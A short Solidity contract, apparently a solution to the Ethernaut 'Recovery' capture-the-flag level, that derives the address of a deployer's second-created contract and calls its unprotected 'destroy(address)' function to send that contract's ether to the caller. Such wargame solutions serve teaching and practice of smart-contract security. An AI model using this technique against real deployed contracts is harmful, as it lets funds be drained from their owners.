// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

contract Ethernaut {

    function addr(address deployer) public view returns(address) {
        // https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed
        // address public nonce0 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(0x80))))));
        address nonce1 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(0x01))))));
        return nonce1;
    }

    function answer(address deployer) external {
        (bool success, bytes memory result) = address(addr(deployer)).call(abi.encodeWithSignature("destroy(address)", msg.sender));
        require(success);
    }

}
